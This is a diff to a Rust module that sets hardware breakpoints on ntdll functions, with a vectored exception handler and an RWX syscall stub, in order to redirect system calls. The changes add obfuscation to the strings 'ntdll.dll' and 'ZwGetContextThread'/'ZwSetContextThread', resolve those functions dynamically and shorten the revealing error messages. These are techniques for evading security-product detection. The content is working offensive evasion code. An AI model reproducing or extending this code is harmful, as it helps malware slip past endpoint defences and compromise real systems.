@@ -1,19 +1,23 @@
 #[allow(unused_imports)]
 
 use std::mem;
-use std::os::raw::c_void;
+// use std::os::raw::c_void;
+use obfuse::obfuse;
 
 
 use anyhow::{Result, anyhow, Ok};
 
-use ntapi::ntzwapi::{ZwGetContextThread, ZwSetContextThread};
-use ntapi::winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS};
 
-use windows::core::PCSTR;
-use windows::Win32::Foundation::{HANDLE, EXCEPTION_SINGLE_STEP};
-use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
-use windows::Win32::System::Memory::{VirtualAlloc, VirtualFree, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
-use windows::Win32::System::Diagnostics::Debug::{AddVectoredExceptionHandler, RemoveVectoredExceptionHandler, EXCEPTION_POINTERS, EXCEPTION_CONTINUE_SEARCH, EXCEPTION_CONTINUE_EXECUTION};
+use winapi::ctypes::c_void;
+use winapi::vc::excpt::{EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH};
+use winapi::um::errhandlingapi::{AddVectoredExceptionHandler, RemoveVectoredExceptionHandler};
+use winapi::um::winnt::{HANDLE, EXCEPTION_POINTERS, CONTEXT, CONTEXT_DEBUG_REGISTERS, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
+use winapi::um::minwinbase::EXCEPTION_SINGLE_STEP;
+use winapi::um::processthreadsapi::GetCurrentThread;
+use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
+use winapi::um::memoryapi::{VirtualAlloc, VirtualFree};
+use winapi::shared::ntdef::PCSTR;
+
 
 const SYSCALL_STUB: [u8; 6] = [
     0x4C, 0x8B, 0xD1, // mov r10, rcx
@@ -27,6 +31,15 @@ static mut SSN_2: u32 = 0;
 static mut SSN_3: u32 = 0;
 static mut STUB_ADDR: *mut u8 = std::ptr::null_mut();
 
+type ZwGetContextThreadFn = unsafe extern "system" fn(
+    ThreadHandle: HANDLE,
+    ThreadContext: *mut CONTEXT,
+) -> i32;
+
+type ZwSetContextThreadFn = unsafe extern "system" fn(
+    ThreadHandle: HANDLE,
+    ThreadContext: *const CONTEXT,
+) -> i32;
 
 
 unsafe extern "system" fn exception_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
@@ -35,7 +48,7 @@ unsafe extern "system" fn exception_handler(exception_info: *mut EXCEPTION_POINT
         let record = &*info.ExceptionRecord;
         let ctx = &mut *info.ContextRecord;
 
-        if record.ExceptionCode.0 == EXCEPTION_SINGLE_STEP.0 {
+        if record.ExceptionCode == EXCEPTION_SINGLE_STEP {
             // let breakpoint_addr = ctx.Dr0;
 
             if record.ExceptionAddress as u64 == ctx.Dr0 {
@@ -82,16 +95,15 @@ unsafe extern "system" fn exception_handler(exception_info: *mut EXCEPTION_POINT
 }
 
 
-
-
 pub unsafe fn hwbp_init() -> Result<()> {
 
     unsafe {
 
         // Allocate memory for the syscall stub and copy the stub code into it
         let stub_size = SYSCALL_STUB.len();
+        // let anticipated_addr * c= std::ptr::null_mut(*c_void);
         let stub_addr = VirtualAlloc(
-            None,
+            std::ptr::null_mut(),
             stub_size,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_EXECUTE_READWRITE,
@@ -124,13 +136,13 @@ pub unsafe fn hwbp_init() -> Result<()> {
 pub unsafe fn hwbp_cleanup() -> Result<()> {
     unsafe {
         // Remove the vectored exception handler
-        RemoveVectoredExceptionHandler(exception_handler as *const c_void);
+        RemoveVectoredExceptionHandler(exception_handler as *mut c_void);
 
         println!("[INFO] Vectored exception handler removed successfully.");
 
         // Free the allocated memory for the syscall stub
         if !STUB_ADDR.is_null() {
-            let _ = VirtualFree(STUB_ADDR as *mut _, 0, windows::Win32::System::Memory::MEM_RELEASE);
+            let _ = VirtualFree(STUB_ADDR as *mut _, 0, MEM_RELEASE);
             println!("[INFO] Syscall stub memory freed.");
         }
 
@@ -191,14 +203,28 @@ fn dr_to_ssn(dr: &DR, ssn: u32) {
     }
 }
 
+
 unsafe fn set_dr_with_ssn(dr: &DR, address: *const u8, ssn: u32) -> Result<()> {
 
     unsafe {
 
+        let obfused_nt_get_context_thread = obfuse!("ZwGetContextThread\0");
+        let obfused_nt_set_context_thread = obfuse!("ZwSetContextThread\0");
+        let obfused_ntdll_dll = obfuse!("ntdll.dll\0");
+        let ntdll_str = obfused_ntdll_dll.as_str();
+        let zw_get_context_thread_str = obfused_nt_get_context_thread.as_str();
+        let zw_set_context_thread_str = obfused_nt_set_context_thread.as_str();
+
+        let ntdll = GetModuleHandleA(ntdll_str.as_ptr() as PCSTR);
+        let zw_get_context_thread_addr = GetProcAddress(ntdll, zw_get_context_thread_str.as_ptr() as PCSTR);
+        let zw_set_context_thread_addr = GetProcAddress(ntdll, zw_set_context_thread_str.as_ptr() as PCSTR);
+        let zw_get_context_thread: ZwGetContextThreadFn = std::mem::transmute(zw_get_context_thread_addr);
+        let zw_set_context_thread: ZwSetContextThreadFn = std::mem::transmute(zw_set_context_thread_addr);
+
         let mut ctx: CONTEXT = mem::zeroed();
         ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-        let status = ZwGetContextThread(
-            HANDLE(-2 as isize as *mut c_void).0 as *mut _,
+        let status = zw_get_context_thread(
+            GetCurrentThread(),
         &mut ctx as *mut CONTEXT,
         );
 
@@ -213,8 +239,8 @@ unsafe fn set_dr_with_ssn(dr: &DR, address: *const u8, ssn: u32) -> Result<()> {
         let dr_index: u32 = dr_to_index(&dr);
         ctx.Dr7 = set_dr7_bit(ctx.Dr7, dr_index << 1u8, 1, 1);
 
-        let status = ZwSetContextThread(
-            HANDLE(-2 as isize as *mut c_void).0 as *mut _,
+        let status = zw_set_context_thread(
+            GetCurrentThread(),
             &mut ctx as *mut CONTEXT,
         );
 
@@ -234,11 +260,11 @@ pub unsafe fn set_hwbp(dr: &DR, func_name: &str) -> Result<()> {
 
     unsafe {
 
-        let ntdll = GetModuleHandleA(PCSTR("ntdll.dll\0".as_ptr()))
-            .expect("[ERROR] Failed to get NTDLL.dll handle.");
+        let obfused_ntdll_dll = obfuse!("ntdll.dll\0");
+        let ntdll_str = obfused_ntdll_dll.as_str();
+        let ntdll = GetModuleHandleA(ntdll_str.as_ptr() as PCSTR);
 
-        let func_addr = GetProcAddress(ntdll, PCSTR(func_name.as_ptr() as *const u8))
-            .expect("[ERROR] Failed to get {func_name} address.");
+        let func_addr = GetProcAddress(ntdll, func_name.as_ptr() as PCSTR);
 
         println!("[INFO] Setting hardware breakpoint on {func_name} at address: 0x{:X}", func_addr as usize);
 
@@ -271,16 +297,29 @@ pub unsafe fn set_hwbp(dr: &DR, func_name: &str) -> Result<()> {
 pub unsafe fn unset_hwbp(dr: &DR) -> Result<()> {
 
     unsafe {
+        let obfused_nt_get_context_thread = obfuse!("ZwGetContextThread\0");
+        let obfused_nt_set_context_thread = obfuse!("ZwSetContextThread\0");
+        let obfused_ntdll_dll = obfuse!("ntdll.dll\0");
+
+        let ntdll_str = obfused_ntdll_dll.as_str();
+        let zw_get_context_thread_str = obfused_nt_get_context_thread.as_str();
+        let zw_set_context_thread_str = obfused_nt_set_context_thread.as_str();
+
+        let ntdll = GetModuleHandleA(ntdll_str.as_ptr() as PCSTR);
+        let zw_get_context_thread_addr = GetProcAddress(ntdll, zw_get_context_thread_str.as_ptr() as PCSTR);
+        let zw_set_context_thread_addr = GetProcAddress(ntdll, zw_set_context_thread_str.as_ptr() as PCSTR);
+        let zw_get_context_thread: ZwGetContextThreadFn = std::mem::transmute(zw_get_context_thread_addr);
+        let zw_set_context_thread: ZwSetContextThreadFn = std::mem::transmute(zw_set_context_thread_addr);
 
         let mut ctx: CONTEXT = mem::zeroed();
         ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-        let status = ZwGetContextThread(
-            HANDLE(-2 as isize as *mut c_void).0 as *mut _,
+        let status = zw_get_context_thread(
+            GetCurrentThread(),
             &mut ctx as *mut CONTEXT,
         );
 
         if status != 0 {
-            return Err(anyhow!("[ERROR] ZwGetContextThread failed with status: 0x{:X}", status).into());
+            return Err(anyhow!("[ERROR] ZGCT failed with status: 0x{:X}", status).into());
         }
 
         set_drbp_register(&mut ctx, &dr, 0);
@@ -288,18 +327,18 @@ pub unsafe fn unset_hwbp(dr: &DR) -> Result<()> {
         let dr_index: u32 = dr_to_index(&dr);
         ctx.Dr7 = set_dr7_bit(ctx.Dr7, dr_index << 1u8, 1, 0);
 
-        let status = ZwSetContextThread(
-            HANDLE(-2 as isize as *mut c_void).0 as *mut _,
+        let status = zw_set_context_thread(
+            GetCurrentThread(),
             &mut ctx as *mut CONTEXT,
         );
 
         if status != 0 {
-            return Err(anyhow!("[ERROR] ZwSetContextThread failed with status: 0x{:X}", status).into());
+            return Err(anyhow!("[ERROR] ZSCT failed with status: 0x{:X}", status).into());
         }
 
     }
 
-    println!("[INFO] Hardware breakpoint on DR{} unset successfully.", dr_to_index(&dr));
+    println!("[INFO] hwbp on DR{} unset successfully.", dr_to_index(&dr));
 
     Ok(())
 
